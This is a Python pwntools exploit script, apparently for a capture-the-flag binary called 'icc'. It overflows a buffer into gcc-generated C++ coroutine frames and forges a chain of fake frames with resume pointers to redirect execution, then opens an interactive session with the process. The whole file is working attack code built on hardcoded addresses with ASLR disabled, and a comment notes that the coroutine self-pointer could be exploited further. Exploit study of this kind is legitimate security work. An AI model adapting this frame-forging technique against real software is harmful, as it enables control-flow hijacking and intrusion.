from pwn import *

context.update(arch='x86_64', os='linux')
context.aslr = False
binary = ELF('./icc')
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./icc')

# Note for future lurkers:
# gcc sometimes generates a 'self' pointer to its own coroutine frame, which is kind of find
# by itself. In here we just point it to itself, but it can be exploited as well :)

VULN_PTR = 0x55555556c6c0
C1_FRAME_PTR = 0x000055555556c6e0
C3_FRAME_PTR = 0x000055555556cb90
C3_FRAME_RESUME_PTR = 0x0000555555555cb0
C3_FRAME_DESTROY_PTR = 0x0000555555555ed0
C1_FRAME_PTR = 0x000055555556c6e0

FORGED_FRAME_PTR_1 = VULN_PTR+0x20
FORGED_FRAME_PTR_2 = FORGED_FRAME_PTR_1+0x40
FORGED_FRAME_PTR_3 = FORGED_FRAME_PTR_2+0x40
FORGED_FRAME_PTR_4 = FORGED_FRAME_PTR_3+0x40
FORGED_FAKE_AFUNCTION_FRAME = FORGED_FRAME_PTR_4+0x40
CONVENIENT_COROUTINE_INDEX = 0x4
AFUNCTION_PTR = 0x00005555555558d0

initial_overflow_payload = b'A'*(C1_FRAME_PTR - VULN_PTR)

overwrite_payload = \
    p64(C3_FRAME_RESUME_PTR) + p64(AFUNCTION_PTR)+\
    p64(FORGED_FAKE_AFUNCTION_FRAME) + p64(FORGED_FRAME_PTR_1) +\
    p64(CONVENIENT_COROUTINE_INDEX) + p64(0x0) +\
    p64(FORGED_FRAME_PTR_2) + p64(0x0) +\
    b'C'*0x0 +\
    p64(0x0) + p64(C3_FRAME_RESUME_PTR)+\
    p64(FORGED_FAKE_AFUNCTION_FRAME) + p64(FORGED_FRAME_PTR_2) +\
    p64(CONVENIENT_COROUTINE_INDEX) + p64(0x0) +\
    p64(FORGED_FRAME_PTR_3) + p64(0x0) +\
    b'C'*0x0 +\
    p64(0xdeadbeef) + p64(C3_FRAME_RESUME_PTR) +\
    p64(FORGED_FAKE_AFUNCTION_FRAME) + p64(FORGED_FRAME_PTR_3) +\
    p64(CONVENIENT_COROUTINE_INDEX) + p64(0x0) +\
    p64(FORGED_FRAME_PTR_4) + p64(0x0) +\
    b'C'*0x0 +\
    p64(0xdeadbeef) + p64(C3_FRAME_RESUME_PTR) +\
    p64(FORGED_FAKE_AFUNCTION_FRAME) + p64(FORGED_FRAME_PTR_4) +\
    p64(CONVENIENT_COROUTINE_INDEX) + p64(0x0) +\
    p64(FORGED_FAKE_AFUNCTION_FRAME) + p64(0x0) +\
    b'C'*0x0 +\
    p64(AFUNCTION_PTR) + p64(AFUNCTION_PTR)


p.recvuntil("starting coros\n")
payload = initial_overflow_payload + overwrite_payload
#payload = payload_class_data
log.info("Overflowing coroutine frames... payload size: "+str(len(payload)))
p.sendline(payload)

print(payload)


p.interactive()
